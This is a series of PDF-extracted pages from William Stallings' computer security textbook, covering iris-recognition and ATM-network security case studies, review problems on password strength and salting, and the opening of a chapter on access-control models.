       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 121, 'page_label': '120'}, page_content='120  CHAPTER 3 / UsER AUTHEnTiCATion\\nits size, the UAE has a very substantial volume of incoming visitors. On a typical day, \\nmore than 6,500 passengers enter the UAE via seven international airports, three \\nland ports, and seven sea ports. Handling a large volume of incoming visitors in an \\nefficient and timely manner thus poses a significant security challenge. Of particular \\nconcern to the UAE are attempts by expelled persons to re-enter the country. Tra -\\nditional means of preventing reentry involve identifying individuals by name, date \\nof birth, and other text-based data. The risk is that this information can be changed \\nafter expulsion. An individual can arrive with a different passport with a different \\nnationality and changes to other identifying information.\\nTo counter such attempts, the UAE decided on using a biometric identification \\nsystem and identified the following requirements:\\n• Identify a single person from a large population of people.\\n• Rely on a biometric feature that does not change over time.\\n• Use biometric features that can be acquired quickly.\\n• Be easy to use.\\n• Respond in real-time for mass transit applications.\\n• Be safe and non-invasive.\\n• Scale into the billions of comparisons and maintain top performance.\\n• Be affordable.\\nIris recognition was chosen as the most efficient and foolproof method. No two irises \\nare alike. There is no correlation between the iris patterns of even identical twins, or \\nthe right and left eye of an individual.\\nSystem implementation involves enrollment and identity checking. All expelled \\nforeigners are subjected to an iris scan at one of the multiple enrollment centers. This \\ninformation is merged into one central database. Iris scanners are installed at all 17 \\nair, land, and sea ports into the UAE. An iris-recognition camera takes a black-and-\\nwhite picture 5 to 24 inches from the eye, depending on the camera. The camera uses \\nnon-invasive, near-infrared illumination that is similar to a TV remote control, barely \\nvisible and considered extremely safe. The picture first is processed by software that \\nlocalizes the inner and outer boundaries of the iris, and the eyelid contours, in order \\nto extract just the iris portion. The software creates a so-called phase code for the \\ntexture of the iris, similar to a DNA sequence code. The unique features of the iris \\nare captured by this code and can be compared against a large database of scanned \\nirises to make a match. Over a distributed network (see Figure 3.14) the iris codes \\nof all arriving passengers are compared in realtime exhaustively against an enrolled \\ncentral database.\\nNote this is computationally a more demanding task than verifying an identity. \\nIn this case, the iris pattern of each incoming passenger is compared against the \\nentire database of known patterns to determine if there is a match. Given the current \\n volume of traffic and size of the database, the daily number of iris cross-comparisons \\nis well over 9 billion.\\nAs with any security system, adversaries are always looking for countermeas-\\nures. UAE officials had to adopt new security methods to detect if an iris has been \\ndilated with eye drops before scanning. Expatriates who were banned from the UAE \\nM03_STAL0611_04_GE_C03.indd   120 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 122, 'page_label': '121'}, page_content='3.8 / CAsE sTUDY: sECURiTY PRoBLEMs FoR ATM sYsTEMs  121\\nstarted using eye drops in an effort to fool the government’s iris recognition system \\nwhen they try to re-enter the country. A new algorithm and computerized step-by-\\nstep procedure has been adopted to help officials determine if an iris is in normal \\ncondition or an eye-dilating drop has been used.\\n 3.8 CASE STUDY: SECURITY PROBLEMS FOR ATM SYSTEMS\\nRedspin, Inc., an independent auditor, released a report describing a security vulner-\\nability in ATM (automated teller machine) usage that affected a number of small to \\nmid-size ATM card issuers. This vulnerability provides a useful case study illustrating \\nthat cryptographic functions and services alone do not guarantee security; they must \\nbe properly implemented as part of a system.\\nWe begin by defining terms used in this section are as follows:\\n• Cardholder: An individual to whom a debit card is issued. Typically, this indi-\\nvidual is also responsible for payment of all charges made to that card.\\nFigure 3.14 General Iris Scan Site Architecture for UAE System\\nIris workstation\\nIris Engine 1 Iris Engine 2\\nIris merge\\nremote\\nIris\\nscanner\\nIris workstation\\nLAN switch\\nNetwork\\nswitch\\nIris\\nscanner\\nIris workstation\\nIris\\nscanner\\nIris\\ndatabase\\nM03_STAL0611_04_GE_C03.indd   121 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 123, 'page_label': '122'}, page_content='122  CHAPTER 3 / UsER AUTHEnTiCATion\\n• Issuer: An institution that issues debit cards to cardholders. This institution is \\nresponsible for the cardholder’s account and authorizes all transactions. Banks \\nand credit unions are typical issuers.\\n• Processor: An organization that provides services such as core data processing \\n(PIN recognition and account updating), electronic funds transfer (EFT), and so \\non to issuers. EFT allows an issuer to access regional and national networks that \\nconnect point of sale (POS) devices and ATMs worldwide. Examples of process-\\ning companies include Fidelity National Financial and Jack Henry & Associates.\\nCustomers expect 24/7 service at ATM stations. For many small to mid-sized \\nissuers, it is more cost-effective for contract processors to provide the required data \\nprocessing and EFT/ATM services. Each service typically requires a dedicated data \\nconnection between the issuer and the processor, using a leased line or a virtual \\nleased line.\\nPrior to about 2003, the typical configuration involving issuer, processor, and \\nATM machines could be characterized by Figure 3.15a. The ATM units linked directly \\nto the processor rather than to the issuer that owned the ATM, via leased or virtual \\nleased line. The use of a dedicated link made it difficult to maliciously intercept \\nFigure 3.15 ATM Architectures Most small to mid-sized issuers of debit cards con-\\ntract processors to provide core data processing and electronic funds transfer (EFT) \\nservices. The bank’s ATM machine may link directly to the processor or to the bank.\\nInternet\\n(a) Point-to-point connection to processor\\n(b) Shared connection to processor \\nProcessor\\n(e.g., Fidelity)\\nEFT exchange\\ne.g., Star, VISAIssuer’s\\ninternal network\\nIssuer-owned ATM\\nInternet\\nIssuer\\n(e.g., bank)\\nIssuer-owned ATM\\nProcessor\\n(e.g., Fidelity)\\nEFT exchange\\ne.g., Star, VISA\\nIssuer\\n(e.g., bank)\\nM03_STAL0611_04_GE_C03.indd   122 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 124, 'page_label': '123'}, page_content='3.8 / CAsE sTUDY: sECURiTY PRoBLEMs FoR ATM sYsTEMs  123\\ntransferred data. To add to the security, the PIN portion of messages transmitted from \\nATM to processor was encrypted using DES (Data Encryption Standard). Proces -\\nsors have connections to EFT (electronic funds transfer) exchange networks to allow \\ncardholders access to accounts from any ATM. With the configuration of Figure 3.15a, \\na transaction proceeds as follows. A user swipes his or her card and enters his or her \\nPIN. The ATM encrypts the PIN and transmits it to the processor as part of an autho-\\nrization request. The processor updates the customer’s information and sends a reply.\\nIn the early 2000s, banks worldwide began the process of migrating from an \\nolder generation of ATMs using IBM’s OS/2 operating system to new systems run -\\nning Windows. The mass migration to Windows has been spurred by a number of \\nfactors, including IBM’s decision to stop supporting OS/2 by 2006, market pressure \\nfrom creditors such as MasterCard International and Visa International to introduce \\nstronger Triple DES, and pressure from U.S. regulators to introduce new features for \\ndisabled users. Many banks, such as those audited by Redspin, included a number of \\nother enhancements at the same time as the introduction of Windows and triple DES, \\nespecially the use of TCP/IP as a network transport.\\nBecause issuers typically run their own Internet-connected local area networks \\n(LANs) and intranets using TCP/IP , it was attractive to connect ATMs to these issuer \\nnetworks and maintain only a single dedicated line to the processor, leading to the \\nconfiguration illustrated in Figure 3.15b. This configuration saves the issuer expen-\\nsive monthly circuit fees and enables easier management of ATMs by the issuer. In \\nthis configuration, the information sent from the ATM to the processor traverses \\nthe issuer’s network before being sent to the processor. It is during this time on the \\nissuer’s network that the customer information is vulnerable.\\nThe security problem was that with the upgrade to a new ATM OS and a new \\ncommunications configuration, the only security enhancement was the use of triple \\nDES rather than DES to encrypt the PIN. The rest of the information in the ATM \\nrequest message is sent in the clear. This includes the card number, expiration date, \\naccount balances, and withdrawal amounts. A hacker tapping into the bank’s network, \\neither from an internal location or from across the Internet potentially would have \\ncomplete access to every single ATM transaction.\\nThe situation just described leads to two principal vulnerabilities:\\n• Confidentiality:  The card number, expiration date, and account balance can \\nbe used for online purchases or to create a duplicate card for signature-based \\ntransactions.\\n• Integrity: There is no protection to prevent an attacker from injecting or alter-\\ning data in transit. If an adversary is able to capture messages en route, the \\nadversary can masquerade as either the processor or the ATM. Acting as the \\nprocessor, the adversary may be able to direct the ATM to dispense money \\nwithout the processor ever knowing that a transaction has occurred. If an adver-\\nsary captures a user’s account information and encrypted PIN, the account is \\ncompromised until the ATM encryption key is changed, enabling the adversary \\nto modify account balances or effect transfers.\\nRedspin recommended a number of measures that banks can take to coun -\\nter these threats. Short-term fixes include segmenting ATM traffic from the rest of \\nM03_STAL0611_04_GE_C03.indd   123 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 125, 'page_label': '124'}, page_content='124  CHAPTER 3 / UsER AUTHEnTiCATion\\nthe network either by implementing strict firewall rule sets or physically dividing \\nthe networks altogether. An additional short-term fix is to implement network-level \\nencryption between routers that the ATM traffic traverses.\\nLong-term fixes involve changes in the application-level software. Protecting \\nconfidentiality requires encrypting all customer-related information that traverses \\nthe network. Ensuring data integrity requires better machine-to-machine authenti -\\ncation between the ATM and processor and the use of challenge-response protocols \\nto counter replay attacks.\\n 3.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nbiometric\\nchallenge-response protocol\\nclaimant\\ncredential\\ncredential service provider \\n(CSP)\\ndynamic biometric\\nenroll\\nhashed password\\nidentification\\nmemory card\\nnonce\\npassword\\nrainbow table\\nregistration authority (RA)\\nrelying party (RP)\\nsalt\\nshadow password file\\nsmart card\\nstatic biometric\\nsubscriber\\ntoken\\nuser authentication\\nverification\\nverifier\\nReview Questions\\n 3.1 In general terms, what are four means of authenticating a user’s identity?\\n 3.2 List and briefly describe the principal threats to the secrecy of passwords.\\n 3.3 What is the significance of a shadow password file?\\n 3.4 Explain how the proactive password checker approach can improve password security.\\n 3.5 How can we classify the authentication protocols used with smart tokens?\\n 3.6 List and briefly describe the principal physical characteristics used for biometric \\nidentification.\\n 3.7 In the context of biometric user authentication, explain the terms, enrollment, verifi-\\ncation, and identification.\\n 3.8 How does remote user authentication dif fer from local authentication? Which one \\nraised more security threats?\\n 3.9 What is a Trojan horse attack?\\nProblems\\n 3.1 Explain the suitability or unsuitability of the following passwords:\\n a. qwerty b. Einstein c. wysiwyg (for “what you see is d. drowssap \\n    what you get”)\\n e. KVK 919 f. Florida g. *laptop_admin# h. cr@zyp@ss\\n 3.2 An early attempt to for ce users to use less predictable passwords involved \\n computer-supplied passwords. These passwords were generated using a pseudorandom \\nM03_STAL0611_04_GE_C03.indd   124 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 126, 'page_label': '125'}, page_content='3.9 / KEY TERMs, REViEW QUEsTions, AnD PRoBLEMs  125\\nnumber generator. Suppose the passwords were nine-character long and were taken \\nfrom the character set consisting of uppercase letters and digits so that the adversary \\nhas to search through all character strings of length 9 from a 36-character alphabet. \\nWould a pseudorandom number generator with 216 possible starting values suffice? If \\nyes, how? If not, then what should be the appropriate range for this pseudorandom \\nnumber generator?\\n 3.3 Assume that Personal Identification Numbers (PINs) ar e formed by nine-digit com -\\nbinations of numbers 0 to 9. Assume that an adversary is able to attempt three PINs \\nper second.\\na. Assuming no feedback to the adversary until each attempt has been completed,  \\nwhat is the expected time to discover the correct PIN?\\nb. Assuming feedback to the adversary flagging an error as each incorrect digit is \\nentered, what is the expected time to discover the correct PIN?\\n 3.4 Assume source elements of length k are mapped in some uniform fashion into a tar -\\nget elements of length p. If each digit can take on one of r values, then the number \\nof source elements is rk and the number of target elements is the smaller number rp. \\nA\\xa0particular source element xi is mapped to a particular target element yj.\\na. What is the probability that the correct source element can be selected by an \\nadversary on one try?\\nb. What is the probability that a different source element xk (xi /uni2260.alt1xk) that results in \\nthe same target element, yj, could be produced by an adversary?\\nc. What is the pr obability that the correct target element can be produced by an \\nadversary on one try?\\n 3.5 A phonetic password generator picks two segments randomly for each six-letter pass-\\nword. The form of each segment is CVC (consonant, vowel, consonant), where \\nV = 6 a, e, i, o, u 7  and C = V.\\na. What is the total password population?\\nb. What is the probability of an adversary guessing a password correctly?\\n 3.6 Assume that credit car d numbers are limited to the use of the 10 digits and that all \\nnumbers are 16 digits in length. Assume that an adversary needs around 31.69 years of \\ntime to test exhaustively all the possible credit card numbers. What is the rate at which \\nthe adversary is testing these numbers?\\n 3.7 The NVIDIA Tesla K-20X GPU has 2688 cores, each operating at a 732-MHz fre -\\nquency. Further, the GPU has 6 GB of DRAM with a bandwidth of 250 GB/sec that \\nis shared among all the cores. If a password hashing scheme (PHS) takes 2 ms to com-\\npute a password:\\na. How many passwords can be tested by the GPU in one hour if the PHS consumes \\nno memory?\\nb. How many cores can work simultaneously if each hash computation r equires 20 \\nMB of DRAM? How many passwords can now be tested by the GPU in one hour?\\n 3.8 The inclusion of the salt in the UNIX passwor d scheme increases the difficulty of \\nguessing by a factor of 4096. But the salt is stored in plaintext in the same entry as the \\ncorresponding ciphertext password. Therefore, those two characters are known to the \\nattacker and need not be guessed. Why is it asserted that the salt increases security?\\n 3.9 Assuming you have successfully answered the preceding problem and understand the \\nsignificance of the salt, here is another question. Wouldn’t it be possible to thwart com-\\npletely all password crackers by dramatically increasing the salt size to, say, 24 or 48 bits?\\n 3.10 Consider the Bloom filter discussed in Section 3.3. Define k = number of hash func-\\ntions; N = number of bits in hash table; and D = number of words in dictionary.\\na. Show that the expected number of bits in the hash table that are equal to zer o is \\nexpressed as\\nf = a1 - k\\nN b\\nD\\nM03_STAL0611_04_GE_C03.indd   125 10/11/17   2:45 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 127, 'page_label': '126'}, page_content='126  CHAPTER 3 / UsER AUTHEnTiCATion\\nb. Show that the probability that an input wor d, not in the dictionary, will be falsely \\naccepted as being in the dictionary is\\nP = (1 - f)k\\nc. Show that the preceding expression can be approximated as\\nP /uni2248(1 - e-kD/N)k\\n 3.11 For the biometric authentication protocols illustrated in Figure 3.13, note the biometric \\ncapture device is authenticated in the case of a static biometric but not  authenticated \\nfor a dynamic biometric. Explain why authentication is useful in the case of a stable \\nbiometric, but not needed in the case of a dynamic biometric.\\n 3.12 A relatively new authentication proposal is the Secure Quick Reliable Login (SQRL) \\ndescribed here: https://www.grc.com/sqrl/sqrl.htm. Write a brief summary of how \\nSQRL works and indicate how it fits into the categories of types of user authentica -\\ntion listed in this chapter.\\nM03_STAL0611_04_GE_C03.indd   126 10/11/17   2:45 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 128, 'page_label': '127'}, page_content='127\\n4.1 Access Control Principles\\nAccess Control Context\\nAccess Control Policies\\n4.2 Subjects, Objects, and Access Rights\\n4.3 Discretionary Access Control\\nAn Access Control Model\\nProtection Domains\\n4.4 Example: Unix File Access Control\\nTraditional UNIX File Access Control\\nAccess Control Lists in UNIX\\n4.5 Role-Based Access Control\\nRBAC Reference Models\\n4.6 Attribute-Based Access Control\\nAttributes\\nABAC Logical Architecture\\nABAC Policies\\n4.7 Identity, Credential, and Access Management\\nIdentity Management\\nCredential Management\\nAccess Management\\nIdentity Federation\\n4.8 Trust Frameworks\\nTraditional Identity Exchange Approach\\nOpen Identity Trust Framework\\n4.9 Case Study: RBAC System for a Bank\\n4.10 Key Terms, Review Questions, and Problems\\nAccess Control\\nCHAPTER \\n \\nM04_STAL0611_04_GE_C04.indd   127 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 129, 'page_label': '128'}, page_content='128  CHAPTER 4 / ACCEss ConTRol\\nTwo definitions of access control are useful in understanding its scope.\\n1. NISTIR 7298 (Glossary of Key Information Security Terms, May 2013), defines \\naccess control as the process of granting or denying specific requests to: (1) \\nobtain and use information and related information processing services; and \\n(2) enter specific physical facilities.\\n2. RFC 4949, Internet Security Glossary , defines access control as a process by \\nwhich use of system resources is regulated according to a security policy and \\nis permitted only by authorized entities (users, programs, processes, or other \\nsystems) according to that policy.\\nWe can view access control as a central element of computer security. The prin-\\ncipal objectives of computer security are to prevent unauthorized users from gaining \\naccess to resources, to prevent legitimate users from accessing resources in an unau-\\nthorized manner, and to enable legitimate users to access resources in an authorized \\nmanner. Table 4.1, from NIST SP 800-171 (Protecting Controlled Unclassified Infor-\\nmation in Nonfederal Information Systems and Organizations, August 2016), provides \\na useful list of security requirements for access control services.\\nWe begin this chapter with an overview of some important concepts. Next \\nwe look at three widely used techniques for implementing access control policies. \\nWe then turn to a broader perspective of the overall management of access control \\nusing identity, credentials, and attributes. Finally, the concept of a trust framework \\nis introduced.\\n 4.1 ACCESS CONTROL PRINCIPLES\\nIn a broad sense, all of computer security is concerned with access control. Indeed, \\nRFC 4949 defines computer security as follows: measures that implement and assure \\nsecurity services in a computer system, particularly those that assure access control \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain how access control fits into the broader context that includes \\n authentication, authorization, and audit.\\n ◆ Define the three major categories of access control policies.\\n ◆ Distinguish among subjects, objects, and access rights.\\n ◆ Describe the UNIX file access control model.\\n ◆ Discuss the principal concepts of role-based access control.\\n ◆ Summarize the RBAC model.\\n ◆ Discuss the principal concepts of attribute-based access control.\\n ◆ Explain the identity, credential, and access management model.\\n ◆ Understand the concept of identity federation and its relationship to a trust \\nframework.\\nM04_STAL0611_04_GE_C04.indd   128 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 130, 'page_label': '129'}, page_content='4.1 / ACCEss ConTRol PRInCIPlEs  129\\nservice. This chapter deals with a narrower, more specific concept of access control: \\nAccess control implements a security policy that specifies who or what (e.g., in the \\ncase of a process) may have access to each specific system resource, and the type of \\naccess that is permitted in each instance.\\nAccess Control Context\\nFigure 4.1 shows a broader context of access control. In addition to access control, \\nthis context involves the following entities and functions:\\n• Authentication: Verification that the credentials of a user or other system entity \\nare valid.\\nBasic Security Requirements\\n 1  Limit information system access to authorized users, processes acting on behalf of authorized users, or \\ndevices (including other information systems).\\n 2  Limit information system access to the types of transactions and functions that authorized users are \\n permitted to execute.\\nDerived Security Requirements\\n 3 Control the flow of CUI in accordance with approved authorizations.\\n 4 Separate the duties of individuals to reduce the risk of malevolent activity without collusion.\\n 5 Employ the principle of least privilege, including for specific security functions and privileged accounts.\\n 6 Use non-privileged accounts or roles when accessing nonsecurity functions.\\n 7 Prevent non-privileged users from executing privileged functions and audit the execution of such functions.\\n 8 Limit unsuccessful logon attempts.\\n 9 Provide privacy and security notices consistent with applicable CUI rules.\\n10  Use session lock with pattern-hiding displays to prevent access and viewing of data after period of inactivity.\\n11 Terminate (automatically) a user session after a defined condition.\\n12 Monitor and control remote access sessions.\\n13 Employ cryptographic mechanisms to protect the confidentiality of remote access sessions.\\n14 Route remote access via managed access control points.\\n15 Authorize remote execution of privileged commands and remote access to security-relevant information.\\n16 Authorize wireless access prior to allowing such connections.\\n17 Protect wireless access using authentication and encryption.\\n18 Control connection of mobile devices.\\n19 Encrypt CUI on mobile devices.\\n20 Verify and control/limit connections to and use of external information systems.\\n21 Limit use of organizational portable storage devices on external information systems.\\n22 Control CUI posted or processed on publicly accessible information systems.\\nCUI = controlled unclassified information\\nSource: From NIST SP 800-171 Protecting Controlled Unclassified Information in Nonfederal Information \\nSystems and Organizations, December 2016 National Institute of Standards and Technology (NIST), United \\nStates Department of Commerce.\\nTable 4.1 Access Control Security Requirements (SP 800-171)\\nM04_STAL0611_04_GE_C04.indd   129 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 131, 'page_label': '130'}, page_content='130  CHAPTER 4 / ACCEss ConTRol\\n• Authorization: The granting of a right or permission to a system entity to access \\na system resource. This function determines who is trusted for a given purpose.\\n• Audit: An independent review and examination of system records and activi -\\nties in order to test for adequacy of system controls, to ensure compliance with \\nestablished policy and operational procedures, to detect breaches in security, \\nand to recommend any indicated changes in control, policy, and procedures.\\nAn access control mechanism mediates between a user (or a process executing \\non behalf of a user) and system resources, such as applications, operating systems, \\nfirewalls, routers, files, and databases. The system must first authenticate an entity \\nseeking access. Typically, the authentication function determines whether the user is \\npermitted to access the system at all. Then the access control function determines if \\nthe specific requested access by this user is permitted. A security administrator main-\\ntains an authorization database that specifies what type of access to which resources \\nis allowed for this user. The access control function consults this database to deter -\\nmine whether to grant access. An auditing function monitors and keeps a record of \\nuser accesses to system resources.\\nFigure 4.1 Relationship Among Access Control and Other Security Functions\\nSource: Based on [SAND94].\\nAuthentication\\nfunction\\nAuthentication\\nAuditing\\nSystem resources\\nAuthorization\\ndatabase\\nSecurity administrator\\nUser\\nAccess control\\nAccess\\ncontrol\\nfunction\\nM04_STAL0611_04_GE_C04.indd   130 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 132, 'page_label': '131'}, page_content='4.2 / sUBJECTs, oBJECTs, AnD ACCEss RIGHTs  131\\nIn the simple model of Figure 4.1, the access control function is shown as a single \\nlogical module. In practice, a number of components may cooperatively share the access \\ncontrol function. All operating systems have at least a rudimentary, and in many cases \\na quite robust, access control component. Add-on security packages can supplement \\nthe native access control capabilities of the operating system. Particular applications \\nor utilities, such as a database management system, also incorporate access control \\nfunctions. External devices, such as firewalls, can also provide access control services.\\nAccess Control Policies\\nAn access control policy, which can be embodied in an authorization database, dic-\\ntates what types of access are permitted, under what circumstances, and by whom. \\nAccess control policies are generally grouped into the following categories:\\n• Discretionary access control (DAC): Controls access based on the identity of \\nthe requestor and on access rules (authorizations) stating what requestors are \\n(or are not) allowed to do. This policy is termed discretionary because an entity \\nmight have access rights that permit the entity, by its own volition, to enable \\nanother entity to access some resource.\\n• Mandatory access control (MAC): Controls access based on comparing secu -\\nrity labels (which indicate how sensitive or critical system resources are) with \\nsecurity clearances (which indicate system entities are eligible to access certain \\nresources). This policy is termed mandatory because an entity that has clearance \\nto access a resource may not, just by its own volition, enable another entity to \\naccess that resource.\\n• Role-based access control (RBAC):  Controls access based on the roles that \\nusers have within the system and on rules stating what accesses are allowed to \\nusers in given roles.\\n• Attribute-based access control (AB AC): Controls access based on attributes \\nof the user, the resource to be accessed, and current environmental conditions.\\nDAC is the traditional method of implementing access control, and is exam -\\nined in Sections 4.3 and 4.4. MAC is a concept that evolved out of requirements for \\nmilitary information security and is best covered in the context of trusted systems, \\nwhich we deal with in Chapter 27 . Both RBAC and ABAC have become increasingly \\npopular, and are examined in Sections 4.5 and 4.6, respectively.\\nThese four policies are not mutually exclusive. An access control mechanism \\ncan employ two or even all three of these policies to cover different classes of system \\nresources.\\n 4.2 SUBJECTS, OBJECTS, AND ACCESS RIGHTS\\nThe basic elements of access control are: subject, object, and access right.\\nA subject is an entity capable of accessing objects. Generally, the concept of \\nsubject equates with that of process. Any user or application actually gains access to \\nan object by means of a process that represents that user or application. The process \\ntakes on the attributes of the user, such as access rights.\\nM04_STAL0611_04_GE_C04.indd   131 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 133, 'page_label': '132'}, page_content='132  CHAPTER 4 / ACCEss ConTRol\\nA subject is typically held accountable for the actions they have initiated, and \\nan audit trail may be used to record the association of a subject with security-relevant \\nactions performed on an object by the subject.\\nBasic access control systems typically define three classes of subject, with \\n different access rights for each class:\\n• Owner: This may be the creator of a resource, such as a file. For system resources, \\nownership may belong to a system administrator. For project resources, a proj-\\nect administrator or leader may be assigned ownership.\\n• Group: In addition to the privileges assigned to an owner, a named group of \\nusers may also be granted access rights, such that membership in the group is \\nsufficient to exercise these access rights. In most schemes, a user may belong \\nto multiple groups.\\n• World: The least amount of access is granted to users who are able to access the \\nsystem but are not included in the categories owner and group for this resource.\\nAn object is a resource to which access is controlled. In general, an object is an \\nentity used to contain and/or receive information. Examples include records, blocks, \\npages, segments, files, portions of files, directories, directory trees, mailboxes, mes -\\nsages, and programs. Some access control systems also encompass, bits, bytes, words, \\nprocessors, communication ports, clocks, and network nodes.\\nThe number and types of objects to be protected by an access control system \\ndepends on the environment in which access control operates and the desired trad -\\neoff between security on the one hand, and complexity, processing burden, and ease \\nof use on the other hand.\\nAn access right  describes the way in which a subject may access an object. \\nAccess rights could include the following:\\n• Read: User may view information in a system resource (e.g., a file, selected \\nrecords in a file, selected fields within a record, or some combination). Read \\naccess includes the ability to copy or print.\\n• Write: User may add, modify, or delete data in system resource (e.g., files, \\nrecords, programs). Write access includes read access.\\n• Execute: User may execute specified programs.\\n• Delete: User may delete certain system resources, such as files or records.\\n• Create: User may create new files, records, or fields.\\n• Search: User may list the files in a directory or otherwise search the directory.\\n 4.3 DISCRETIONARY ACCESS CONTROL\\nAs was previously stated, a discretionary access control scheme is one in which an \\nentity may be granted access rights that permit the entity, by its own volition, to \\nenable another entity to access some resource. A general approach to DAC, as exer-\\ncised by an operating system or a database management system, is that of an access \\nmatrix. The access matrix concept was formulated by Lampson [LAMP69, LAMP71], \\nM04_STAL0611_04_GE_C04.indd   132 10/11/17   2:47 PM'),\n",
